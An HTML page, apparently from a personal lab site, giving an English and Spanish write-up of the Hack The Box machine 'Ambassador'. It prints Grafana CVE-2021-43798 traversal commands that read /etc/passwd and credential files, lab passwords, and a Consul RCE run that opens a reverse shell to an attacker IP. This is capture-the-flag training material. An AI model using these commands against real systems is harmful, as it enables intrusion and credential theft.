@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ambassador | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">ambassador</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running Grafana 8.2.0 on port 3000, which is vulnerable to CVE-2021-43798, a directory traversal vulnerability that allows arbitrary file reading. By exploiting this vulnerability through vulnerable Grafana plugins, I was able to read sensitive configuration files including database credentials and the Grafana administrator password.</p>
+                    
+                    <p>Using the directory traversal, I extracted MySQL credentials from <code>/etc/grafana/provisioning/datasources/mysql.yaml</code> and accessed the database, where I found base64-encoded SSH credentials for the <code>developer</code> user in the <code>wackywidget</code> database. This allowed me to gain initial access to the system via SSH.</p>
+                    
+                    <p>After obtaining a foothold, I discovered that the machine was running Consul, a service mesh solution. Through enumeration of the <code>/opt/my-app</code> directory's Git history, I found a committed Consul ACL token with elevated privileges. Using this token with a Consul RCE exploit, I was able to execute commands as root by abusing Consul's service registration and health check features, ultimately obtaining a root shell.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Grafana directory traversal (CVE-2021-43798), MySQL credential extraction, Consul RCE via privileged ACL token exploitation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and services running on the target:</p>
+                <p><img src="./media/image2.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, MySQL on 3306, and Grafana on 3000" /></p>
+
+                <p>The scan reveals several interesting services. Most notably, port 80 is running an HTTP server, port 3000 is running Grafana, and port 3306 is running MySQL. This combination suggests a monitoring infrastructure setup.</p>
+
+                <h2>Web Enumeration - Apache Server on Port 80</h2>
+                <p>Navigating to port 80, I find a simple landing page with a message mentioning a <code>developer</code> user:</p>
+                <p><img src="./media/image3.png" alt="Landing page showing a message mentioning the developer user" /></p>
+
+                <p>This is valuable information - I now have a confirmed username that likely exists on the system. This could be useful for SSH brute-forcing, MySQL authentication, or Grafana login attempts.</p>
+
+                <p>Running <code>whatweb</code> provides additional information about the web server:</p>
+                <pre><code class="language-plaintext">http://10.10.11.183 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.183], 
+MetaGenerator[Hugo 0.94.2], Open-Graph-Protocol[website], 
+Title[Ambassador Development Server], X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>The site appears to be built with Hugo, a static site generator. I run <code>gobuster</code> for directory enumeration:</p>
+                <p><img src="./media/image4.png" alt="Gobuster scan results showing discovered directories" /></p>
+
+                <p>The gobuster scan doesn't reveal anything particularly interesting beyond standard directories. Initial brute-force attempts against SSH and MySQL services with the <code>developer</code> username also prove unsuccessful.</p>
+
+                <h2>Grafana Enumeration - Version Identification</h2>
+                <p>Turning my attention to port 3000, I access the Grafana web interface. Conveniently, the footer reveals the exact version: <strong>Grafana 8.2.0</strong>.</p>
+
+                <h2>Vulnerability Research - CVE-2021-43798</h2>
+                <p>Searching for vulnerabilities affecting this version, I find an important security advisory from Grafana: <a href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/">Grafana 8.3.1, 8.2.7, 8.1.8, and 8.0.7 Released with High Severity Security Fix</a>.</p>
+
+                <p>The advisory discloses <strong>CVE-2021-43798</strong>, a directory traversal vulnerability that affects unpatched Grafana installations. This vulnerability allows an unauthenticated attacker to read arbitrary files from the server by exploiting vulnerable plugins.</p>
+
+                <p>I locate a proof-of-concept exploit on GitHub: <a href="https://github.com/Jroo1053/GrafanaDirInclusion">https://github.com/Jroo1053/GrafanaDirInclusion</a></p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The CVE-2021-43798 vulnerability exploits a path traversal flaw in Grafana's plugin handling. By crafting requests to vulnerable plugin endpoints with directory traversal sequences (<code>../</code>), an attacker can escape the intended plugin directory and read arbitrary files from the filesystem that the Grafana process has access to.</p>
+
+                <p>The exploit works by iterating through a list of known vulnerable plugins and attempting to read files through each one until successful.</p>
+
+                <h2>Initial Access - Exploiting Grafana Directory Traversal</h2>
+                <p>Running the exploit confirms that I have a working Local File Inclusion (LFI) capability. First, I verify the existence of the <code>developer</code> user by reading <code>/etc/passwd</code>:</p>
+
+                <pre><code class="language-bash">python exploit.py -u 10.10.11.183 -p 3000 -f /../../../../../../../../../../../../../etc/passwd</code></pre>
+
+                <p>This confirms that <code>developer</code> is indeed a valid user on the system.</p>
+
+                <h3>Extracting Grafana Credentials</h3>
+                <p>Next, I target the Grafana configuration file to look for sensitive information:</p>
+                <pre><code class="language-bash">python exploit.py -u 10.10.11.183 -p 3000 -f /../../../../../../../../../../../../../etc/grafana/grafana.ini</code></pre>
+
+                <p>In the configuration file, I discover hardcoded administrator credentials:</p>
+                <pre><code class="language-plaintext">admin:messageInABottle685427</code></pre>
+
+                <p>These credentials allow me to access the Grafana web interface with full administrative privileges.</p>
+
+                <h3>Extracting MySQL Credentials</h3>
+                <p>Grafana stores datasource configurations in provisioning files. I target the MySQL datasource configuration:</p>
+                <pre><code class="language-bash">python exploit.py -u 10.10.11.183 -p 3000 -f /../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml</code></pre>
+
+                <p>The exploit returns the MySQL datasource configuration:</p>
+                <pre><code class="language-yaml">apiVersion: 1
+datasources:
+  - name: mysql.yaml
+    type: mysql
+    host: localhost
+    database: grafana
+    user: grafana
+    password: dontStandSoCloseToMe63221!
+    editable: false</code></pre>
+
+                <p>Now I have MySQL credentials: <code>grafana:dontStandSoCloseToMe63221!</code></p>
+
+                <h3>MySQL Database Enumeration</h3>
+                <p>I connect to the MySQL server using the extracted credentials:</p>
+                <pre><code class="language-bash">mysql -h 10.10.11.183 -u grafana -p</code></pre>
+
+                <p>Upon examining the databases, I find that the <code>grafana</code> database is mostly empty. However, there's another database called <code>wackywidget</code> that contains interesting data.</p>
+
+                <p>Exploring this database, I discover a table with what appears to be base64-encoded credentials. After decoding, I obtain SSH credentials for the <code>developer</code> user:</p>
+                <pre><code class="language-plaintext">developer:anEnglishManInNewYork027468</code></pre>
+
+                <h3>SSH Access</h3>
+                <p>Using these credentials, I successfully authenticate via SSH:</p>
+                <pre><code class="language-bash">ssh developer@10.10.11.183</code></pre>
+
+                <p>I now have shell access as the <code>developer</code> user and can retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - Consul Enumeration</h2>
+                <p>After gaining initial access, I enumerate the system for privilege escalation vectors. Running <code>ss -tuln</code> reveals several interesting local ports:</p>
+                <p><img src="./media/image1.png" alt="Output of ss -tuln showing multiple listening ports including Consul-related ports" /></p>
+
+                <p>The port pattern suggests that <strong>Consul</strong> is running on the system. Consul is a service mesh solution that provides service discovery, configuration, and segmentation functionality.</p>
+
+                <h3>Initial Consul Exploitation Attempts</h3>
+                <p>I initially attempt to use a known Consul RCE exploit from Exploit-DB: <a href="https://www.exploit-db.com/exploits/51117">https://www.exploit-db.com/exploits/51117</a>, but this particular exploit doesn't work in this scenario.</p>
+
+                <p>I then find another Consul RCE proof-of-concept: <a href="https://github.com/owalid/consul-rce">https://github.com/owalid/consul-rce</a>. When attempting to use this exploit, I encounter a permission error:</p>
+
+                <pre><code class="language-plaintext">[-] Error creating check vrkmahkqguagpti
+Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' 
+lacks permission 'service:write' on "pwn"</code></pre>
+
+                <p>This error indicates that I'm using an anonymous or unprivileged Consul token. The exploit requires a token with <code>service:write</code> permissions to register a malicious service.</p>
+
+                <h3>Searching for Consul ACL Tokens</h3>
+                <p>I attempt to list Consul ACL tokens but receive another permission error:</p>
+                <pre><code class="language-bash">consul acl token list</code></pre>
+
+                <pre><code class="language-plaintext">Failed to retrieve the token list: Unexpected response code: 403 
+(Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' 
+lacks permission 'acl:read')</code></pre>
+
+                <p>It's clear that I need to find a privileged Consul token to proceed with the exploitation.</p>
+
+                <h3>File System Enumeration</h3>
+                <p>While exploring the filesystem, I notice that the <code>developer</code> user's group has write and execute permissions on <code>/etc/consul.d/config.d/</code>. Additionally, using <code>pspy64</code>, I observe that root performs cleanup operations on this directory every 10 minutes.</p>
+
+                <p>However, before pursuing this vector, I continue my enumeration.</p>
+
+                <h3>Git Repository Discovery</h3>
+                <p>In <code>/opt/my-app</code>, I discover what appears to be an application directory containing a <code>.git</code> repository. Git repositories often contain sensitive information in their commit history.</p>
+
+                <p>I examine the Git history using <code>git log</code>:</p>
+                <pre><code class="language-bash">cd /opt/my-app
+git log</code></pre>
+
+                <p>Looking through the commits, I find that a Consul ACL token was accidentally committed to the repository:</p>
+                <p><img src="./media/image5.png" alt="Git log output showing a commit that included a Consul token" /></p>
+
+                <p>By examining the relevant commit with <code>git show</code>, I extract the Consul token:</p>
+                <pre><code class="language-plaintext">bb03b43b-1d81-d62b-24b5-39540ee469b5</code></pre>
+
+                <h2>Root Access - Consul RCE with Privileged Token</h2>
+                <p>Now that I have a privileged Consul ACL token, I can successfully exploit Consul to execute commands as root. The Consul RCE vulnerability works by:</p>
+
+                <ol>
+                    <li>Registering a malicious service with Consul using the privileged token</li>
+                    <li>Defining a health check for that service that executes arbitrary commands</li>
+                    <li>When Consul runs the health check (which it does as the root user running the Consul agent), our payload executes with root privileges</li>
+                </ol>
+
+                <p>I set up a netcat listener on my attacking machine:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Then I execute the Consul RCE exploit with the discovered token:</p>
+                <pre><code class="language-bash">python3 exploit.py localhost 8500 10.10.16.6 443 bb03b43b-1d81-d62b-24b5-39540ee469b5</code></pre>
+
+                <p>The exploit successfully registers the malicious service:</p>
+                <pre><code class="language-plaintext">[+] Request sent successfully, check your listener</code></pre>
+
+                <p>My netcat listener receives the reverse shell connection:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.11.183] 41538
+bash: cannot set terminal process group (4559): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ambassador:/# whoami
+root</code></pre>
+
+                <p>I now have root access to the system and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba Grafana 8.2.0 en el puerto 3000, vulnerable a CVE-2021-43798, una vulnerabilidad de directory traversal que permite la lectura arbitraria de archivos. Explotando esta vulnerabilidad a través de plugins vulnerables de Grafana, pude leer archivos de configuración sensibles incluyendo credenciales de base de datos y la contraseña de administrador de Grafana.</p>
+                    
+                    <p>Utilizando el directory traversal, extraje credenciales de MySQL desde <code>/etc/grafana/provisioning/datasources/mysql.yaml</code> y accedí a la base de datos, donde encontré credenciales SSH codificadas en base64 para el usuario <code>developer</code> en la base de datos <code>wackywidget</code>. Esto me permitió obtener acceso inicial al sistema mediante SSH.</p>
+                    
+                    <p>Tras conseguir un punto de apoyo, descubrí que la máquina ejecutaba Consul, una solución de service mesh. Mediante la enumeración del historial de Git del directorio <code>/opt/my-app</code>, encontré un token ACL de Consul commiteado con privilegios elevados. Usando este token con un exploit de RCE en Consul, pude ejecutar comandos como root abusando de las funcionalidades de registro de servicios y health checks de Consul, obteniendo finalmente una shell de root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Directory traversal en Grafana (CVE-2021-43798), extracción de credenciales MySQL, RCE en Consul mediante explotación de token ACL privilegiado.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en el objetivo:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80, MySQL en el 3306 y Grafana en el 3000" /></p>
+
+                <p>El escaneo revela varios servicios interesantes. Destacando, el puerto 80 ejecuta un servidor HTTP, el puerto 3000 ejecuta Grafana y el puerto 3306 ejecuta MySQL. Esta combinación sugiere una infraestructura de monitorización.</p>
+
+                <h2>Enumeración Web - Servidor Apache en el Puerto 80</h2>
+                <p>Navegando al puerto 80, encuentro una página de inicio simple con un mensaje que menciona un usuario <code>developer</code>:</p>
+                <p><img src="./media/image3.png" alt="Página de inicio mostrando un mensaje mencionando el usuario developer" /></p>
+
+                <p>Esta es información valiosa - ahora tengo un nombre de usuario confirmado que probablemente existe en el sistema. Esto podría ser útil para fuerza bruta en SSH, autenticación en MySQL o intentos de inicio de sesión en Grafana.</p>
+
+                <p>Ejecutando <code>whatweb</code> obtengo información adicional sobre el servidor web:</p>
+                <pre><code class="language-plaintext">http://10.10.11.183 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.183], 
+MetaGenerator[Hugo 0.94.2], Open-Graph-Protocol[website], 
+Title[Ambassador Development Server], X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>El sitio parece estar construido con Hugo, un generador de sitios estáticos. Ejecuto <code>gobuster</code> para enumeración de directorios:</p>
+                <p><img src="./media/image4.png" alt="Resultados del escaneo de gobuster mostrando directorios descubiertos" /></p>
+
+                <p>El escaneo de gobuster no revela nada particularmente interesante más allá de directorios estándar. Los intentos iniciales de fuerza bruta contra los servicios SSH y MySQL con el nombre de usuario <code>developer</code> también resultan infructuosos.</p>
+
+                <h2>Enumeración de Grafana - Identificación de Versión</h2>
+                <p>Dirigiendo mi atención al puerto 3000, accedo a la interfaz web de Grafana. Convenientemente, el footer revela la versión exacta: <strong>Grafana 8.2.0</strong>.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2021-43798</h2>
+                <p>Buscando vulnerabilidades que afecten a esta versión, encuentro un aviso de seguridad importante de Grafana: <a href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/">Grafana 8.3.1, 8.2.7, 8.1.8 y 8.0.7 Released with High Severity Security Fix</a>.</p>
+
+                <p>El aviso divulga <strong>CVE-2021-43798</strong>, una vulnerabilidad de directory traversal que afecta a instalaciones de Grafana sin parchear. Esta vulnerabilidad permite a un atacante no autenticado leer archivos arbitrarios del servidor explotando plugins vulnerables.</p>
+
+                <p>Localizo una prueba de concepto del exploit en GitHub: <a href="https://github.com/Jroo1053/GrafanaDirInclusion">https://github.com/Jroo1053/GrafanaDirInclusion</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad CVE-2021-43798 explota un fallo de path traversal en el manejo de plugins de Grafana. Creando peticiones a endpoints de plugins vulnerables con secuencias de directory traversal (<code>../</code>), un atacante puede escapar del directorio de plugins previsto y leer archivos arbitrarios del sistema de archivos a los que el proceso de Grafana tenga acceso.</p>
+
+                <p>El exploit funciona iterando a través de una lista de plugins vulnerables conocidos e intentando leer archivos a través de cada uno hasta tener éxito.</p>
+
+                <h2>Acceso Inicial - Explotando Directory Traversal en Grafana</h2>
+                <p>Ejecutando el exploit confirmo que tengo una capacidad de Local File Inclusion (LFI) funcional. Primero, verifico la existencia del usuario <code>developer</code> leyendo <code>/etc/passwd</code>:</p>
+
+                <pre><code class="language-bash">python exploit.py -u 10.10.11.183 -p 3000 -f /../../../../../../../../../../../../../etc/passwd</code></pre>
+
+                <p>Esto confirma que <code>developer</code> es efectivamente un usuario válido en el sistema.</p>
+
+                <h3>Extrayendo Credenciales de Grafana</h3>
+                <p>A continuación, apunto al archivo de configuración de Grafana para buscar información sensible:</p>
+                <pre><code class="language-bash">python exploit.py -u 10.10.11.183 -p 3000 -f /../../../../../../../../../../../../../etc/grafana/grafana.ini</code></pre>
+
+                <p>En el archivo de configuración, descubro credenciales de administrador hardcodeadas:</p>
+                <pre><code class="language-plaintext">admin:messageInABottle685427</code></pre>
+
+                <p>Estas credenciales me permiten acceder a la interfaz web de Grafana con privilegios administrativos completos.</p>
+
+                <h3>Extrayendo Credenciales de MySQL</h3>
+                <p>Grafana almacena configuraciones de datasources en archivos de provisioning. Apunto a la configuración del datasource MySQL:</p>
+                <pre><code class="language-bash">python exploit.py -u 10.10.11.183 -p 3000 -f /../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml</code></pre>
+
+                <p>El exploit devuelve la configuración del datasource MySQL:</p>
+                <pre><code class="language-yaml">apiVersion: 1
+datasources:
+  - name: mysql.yaml
+    type: mysql
+    host: localhost
+    database: grafana
+    user: grafana
+    password: dontStandSoCloseToMe63221!
+    editable: false</code></pre>
+
+                <p>Ahora tengo credenciales de MySQL: <code>grafana:dontStandSoCloseToMe63221!</code></p>
+
+                <h3>Enumeración de Base de Datos MySQL</h3>
+                <p>Me conecto al servidor MySQL usando las credenciales extraídas:</p>
+                <pre><code class="language-bash">mysql -h 10.10.11.183 -u grafana -p</code></pre>
+
+                <p>Al examinar las bases de datos, encuentro que la base de datos <code>grafana</code> está mayormente vacía. Sin embargo, hay otra base de datos llamada <code>wackywidget</code> que contiene datos interesantes.</p>
+
+                <p>Explorando esta base de datos, descubro una tabla con lo que parecen ser credenciales codificadas en base64. Después de decodificar, obtengo credenciales SSH para el usuario <code>developer</code>:</p>
+                <pre><code class="language-plaintext">developer:anEnglishManInNewYork027468</code></pre>
+
+                <h3>Acceso SSH</h3>
+                <p>Usando estas credenciales, me autentico exitosamente mediante SSH:</p>
+                <pre><code class="language-bash">ssh developer@10.10.11.183</code></pre>
+
+                <p>Ahora tengo acceso shell como usuario <code>developer</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Enumeración de Consul</h2>
+                <p>Tras obtener acceso inicial, enumero el sistema buscando vectores de escalada de privilegios. Ejecutando <code>ss -tuln</code> revelo varios puertos locales interesantes:</p>
+                <p><img src="./media/image1.png" alt="Salida de ss -tuln mostrando múltiples puertos en escucha incluyendo puertos relacionados con Consul" /></p>
+
+                <p>El patrón de puertos sugiere que <strong>Consul</strong> está ejecutándose en el sistema. Consul es una solución de service mesh que proporciona descubrimiento de servicios, configuración y funcionalidad de segmentación.</p>
+
+                <h3>Intentos Iniciales de Explotación de Consul</h3>
+                <p>Inicialmente intento usar un exploit conocido de RCE en Consul desde Exploit-DB: <a href="https://www.exploit-db.com/exploits/51117">https://www.exploit-db.com/exploits/51117</a>, pero este exploit particular no funciona en este escenario.</p>
+
+                <p>Luego encuentro otra prueba de concepto de RCE en Consul: <a href="https://github.com/owalid/consul-rce">https://github.com/owalid/consul-rce</a>. Al intentar usar este exploit, encuentro un error de permisos:</p>
+
+                <pre><code class="language-plaintext">[-] Error creating check vrkmahkqguagpti
+Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' 
+lacks permission 'service:write' on "pwn"</code></pre>
+
+                <p>Este error indica que estoy usando un token de Consul anónimo o sin privilegios. El exploit requiere un token con permisos <code>service:write</code> para registrar un servicio malicioso.</p>
+
+                <h3>Buscando Tokens ACL de Consul</h3>
+                <p>Intento listar los tokens ACL de Consul pero recibo otro error de permisos:</p>
+                <pre><code class="language-bash">consul acl token list</code></pre>
+
+                <pre><code class="language-plaintext">Failed to retrieve the token list: Unexpected response code: 403 
+(Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' 
+lacks permission 'acl:read')</code></pre>
+
+                <p>Está claro que necesito encontrar un token de Consul privilegiado para proceder con la explotación.</p>
+
+                <h3>Enumeración del Sistema de Archivos</h3>
+                <p>Mientras exploro el sistema de archivos, noto que el grupo del usuario <code>developer</code> tiene permisos de escritura y ejecución en <code>/etc/consul.d/config.d/</code>. Además, usando <code>pspy64</code>, observo que root realiza operaciones de limpieza en este directorio cada 10 minutos.</p>
+
+                <p>Sin embargo, antes de perseguir este vector, continúo mi enumeración.</p>
+
+                <h3>Descubrimiento de Repositorio Git</h3>
+                <p>En <code>/opt/my-app</code>, descubro lo que parece ser un directorio de aplicación que contiene un repositorio <code>.git</code>. Los repositorios Git a menudo contienen información sensible en su historial de commits.</p>
+
+                <p>Examino el historial de Git usando <code>git log</code>:</p>
+                <pre><code class="language-bash">cd /opt/my-app
+git log</code></pre>
+
+                <p>Revisando los commits, encuentro que un token ACL de Consul fue accidentalmente commiteado al repositorio:</p>
+                <p><img src="./media/image5.png" alt="Salida de git log mostrando un commit que incluía un token de Consul" /></p>
+
+                <p>Examinando el commit relevante con <code>git show</code>, extraigo el token de Consul:</p>
+                <pre><code class="language-plaintext">bb03b43b-1d81-d62b-24b5-39540ee469b5</code></pre>
+
+                <h2>Acceso Root - RCE en Consul con Token Privilegiado</h2>
+                <p>Ahora que tengo un token ACL privilegiado de Consul, puedo explotar exitosamente Consul para ejecutar comandos como root. La vulnerabilidad de RCE en Consul funciona mediante:</p>
+
+                <ol>
+                    <li>Registrar un servicio malicioso con Consul usando el token privilegiado</li>
+                    <li>Definir un health check para ese servicio que ejecuta comandos arbitrarios</li>
+                    <li>Cuando Consul ejecuta el health check (lo cual hace como el usuario root que ejecuta el agente de Consul), nuestro payload se ejecuta con privilegios de root</li>
+                </ol>
+
+                <p>Configuro un listener de netcat en mi máquina atacante:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Luego ejecuto el exploit de RCE en Consul con el token descubierto:</p>
+                <pre><code class="language-bash">python3 exploit.py localhost 8500 10.10.16.6 443 bb03b43b-1d81-d62b-24b5-39540ee469b5</code></pre>
+
+                <p>El exploit registra exitosamente el servicio malicioso:</p>
+                <pre><code class="language-plaintext">[+] Request sent successfully, check your listener</code></pre>
+
+                <p>Mi listener de netcat recibe la conexión de reverse shell:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.11.183] 41538
+bash: cannot set terminal process group (4559): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ambassador:/# whoami
+root</code></pre>
+
+                <p>Ahora tengo acceso root al sistema y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
